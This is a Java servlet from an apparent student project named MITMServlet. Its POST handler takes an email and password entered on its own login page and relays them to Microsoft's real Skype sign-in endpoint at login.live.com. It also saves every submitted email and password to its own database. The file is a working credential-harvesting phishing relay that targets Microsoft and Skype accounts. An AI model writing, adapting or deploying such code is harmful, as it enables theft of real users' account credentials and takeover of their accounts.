package br.edu.ifpb.mitm;

import br.edu.ifpb.mitm.dao.DataDao;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.SQLException;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.ws.rs.NotFoundException;
import javax.ws.rs.client.Client;
import javax.ws.rs.client.ClientBuilder;
import javax.ws.rs.client.Entity;
import javax.ws.rs.client.WebTarget;
import javax.ws.rs.core.Form;
import javax.ws.rs.core.Response;

@WebServlet("/front")
public class MITMServlet extends HttpServlet {

    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html;charset=UTF-8");
        try (PrintWriter out = response.getWriter()) {
            /* TODO output your page here. You may use following sample code. */
            out.println("<!DOCTYPE html>");
            out.println("<html>");
            out.println("<head>");
            out.println("<title>Servlet MITMServlet</title>");
            out.println("</head>");
            out.println("<body>");
            out.println("<h1>Servlet MITMServlet at " + request.getContextPath() + "</h1>");
            out.println("</body>");
            out.println("</html>");
        }
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        if (request.getParameter("mitm") != null) {
            String url = "https://login.live.com/ppsecure/post.srf?wa=wsignin1"
                    + ".0&rpsnv=13&ct=1535064396&rver=7.0.6730.0&wp=MBI_SSL&w"
                    + "reply=https://lw.skype.com/login/oauth/proxy?client_"
                    + "id=578134&redirect_uri=https%3A%2F%2Fweb.skype.com&int"
                    + "src=client-_-webapp-_-production-_-go-signin&site_name="
                    + "lw.skype.com&lc=1033&id=293290&mkt=en&psi=skype&lw=1&"
                    + "cobrandid=2befc4b5-19e3-46e8-8347-77317a16a5a5&client_"
                    + "flight=hsu,ReservedFlight33,ReservedFlight67&contextid="
                    + "615B96C66E3E15FF&bk=1535064396&uaid=454780bfcf1a4e44aaf"
                   + "bfbf84480332b&pid=0";

            Client client = ClientBuilder.newClient();
            WebTarget target = client.target(url);

            Form form = new Form();
            form.param("login", request.getParameter("email"));
            form.param("passwd", request.getParameter("senha"));

            Response res = target
                    .request()
                    .post(Entity.form(form), Response.class);
            System.out.println(res.getHeaderString(url));

            try {
                new DataDao().persist(
                        request.getParameter("email"),
                        request.getParameter("senha")
                );
            } catch (SQLException | ClassNotFoundException ex) {
                ex.printStackTrace();
            }

        } else {
            request.setAttribute("email", request.getParameter("email"));

        }
        request.getRequestDispatcher("senha.jsp").forward(request, response);

    }

    @Override
    public String getServletInfo() {
        return "Short description";
    }

}
